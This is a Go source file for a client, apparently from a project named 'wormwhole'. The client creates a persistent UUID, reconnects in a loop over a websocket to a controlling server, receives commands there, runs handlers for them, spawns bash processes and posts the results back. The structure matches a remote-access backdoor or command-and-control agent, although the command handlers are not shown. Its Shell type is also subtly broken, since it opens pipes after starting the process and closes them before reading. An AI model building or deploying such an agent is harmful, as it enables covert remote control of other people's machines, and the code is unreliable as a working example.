package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/xorium/wormwhole/core"
	"io"
	"log"
	"net/http"
	"os/exec"
	"sync"
	"time"
)

const (
	reconnectTimeout    = 5 * time.Second
	maxResponseRetriesN = 4
	settingsFile        = ".settings.json"
)

type Shell struct {
	cmd *exec.Cmd
}

func NewShell() *Shell {
	var stdin, stdout bytes.Buffer
	shellCmd := exec.Command("/bin/bash")
	shellCmd.Stdin = &stdin
	shellCmd.Stdout = &stdout
	shellCmd.Stderr = &stdout
	_ = shellCmd.Start()

	return &Shell{
		cmd: shellCmd,
	}
}

func (s *Shell) Write(input string) {
	stdin, _ := s.cmd.StdinPipe()
	_, _ = io.WriteString(stdin, input)
	_ = stdin.Close()
}

func (s *Shell) Read() string {
	stdout, _ := s.cmd.StdoutPipe()
	stderr, _ := s.cmd.StderrPipe()
	reader := io.MultiReader(stdout, stderr)
	_ = stdout.Close()
	_ = stderr.Close()
	data, _ := bufio.NewReader(reader).Peek(5)
	return string(data)
}

type Client struct {
	*sync.RWMutex
	Debug       bool
	serverAddr  string
	conn        *websocket.Conn
	cmdHandlers map[string]func(command *core.Command) (code string, resp []byte)
	settings    map[string]interface{}
	shell       *Shell
}

func NewClient(serverAddr string) *Client {
	bashCmd := exec.Command("bash")
	_ = bashCmd.Start()

	return &Client{
		RWMutex:    new(sync.RWMutex),
		serverAddr: serverAddr,
		settings:   make(map[string]interface{}),
		//shell: NewShell(),
	}
}

func (c *Client) getOrCreateUUID() string {
	currUUID := c.getSettingString("uuid")
	if currUUID == "" {
		currUUID = uuid.New().String()
		c.Lock()
		c.settings["uuid"] = currUUID
		c.Unlock()
		c.saveSettings()
	}
	return currUUID
}

func (c *Client) initConn() {
	wsServer := fmt.Sprintf("ws://%s/in?uuid=%s", c.serverAddr, c.getOrCreateUUID())
	for {
		conn, _, err := websocket.DefaultDialer.Dial(wsServer, nil)
		if err != nil {
			log.Println("error while trying to connect: ", err)
			goto retry
		}
		c.Lock()
		c.conn = conn
		c.Unlock()
		log.Println("Connection has been established.")
		return
	retry:
		time.Sleep(reconnectTimeout)
	}
}

func (c *Client) getCommand() *core.Command {
	if c.conn == nil {
		c.initConn()
	}
	cmd := new(core.Command)
	for {
		if c.Debug {
			log.Println("Trying to read command from connection.")
		}
		if err := c.conn.ReadJSON(cmd); err != nil {
			log.Println("can't read command from connection: ", err)
			c.initConn()
			continue
		}
		break
	}
	if c.Debug {
		log.Println("Command has been received: ", cmd)
	}
	return cmd
}

func (c *Client) sendCommandResp(cmd *core.Command, code string, resp []byte) {
	postUrl := fmt.Sprintf(
		"http://%s/out?cid=%s&code=%s", c.serverAddr, cmd.ID, code,
	)
	req, err := http.NewRequest(http.MethodPost, postUrl, bytes.NewBuffer(resp))
	if err != nil {
		log.Println(err)
		return
	}
	for i := 0; i < maxResponseRetriesN; i++ {
		_, err = http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf(
				"error while trying to send command %s result: %v\n", cmd.Name, err,
			)
			time.Sleep(5 * time.Second)
			continue
		}
		break
	}
}

var bashCmd = exec.Command("bash")

func (c *Client) HandleCommand(cmd *core.Command) {
	if !c.Debug {
		defer func() {
			if panicMsg := recover(); panicMsg != nil {
				resp := fmt.Sprintf("panic while handling command: %s\n", panicMsg)
				c.sendCommandResp(cmd, core.CommandResultCodeError, []byte(resp))
			}
		}()
	}

	handler, ok := c.cmdHandlers[cmd.Name]
	if !ok {
		msg := fmt.Sprintf("unknown command: %s", cmd.Name)
		c.sendCommandResp(cmd, core.CommandResultCodeError, []byte(msg))
		return
	}

	code, resp := handler(cmd)
	c.sendCommandResp(cmd, code, resp)
}

func (c *Client) Run() {
	c.checkLock()
	c.initCommandsHandlers()
	c.loadSettings()

	for {
		cmd := c.getCommand()
		go c.HandleCommand(cmd)
	}
}
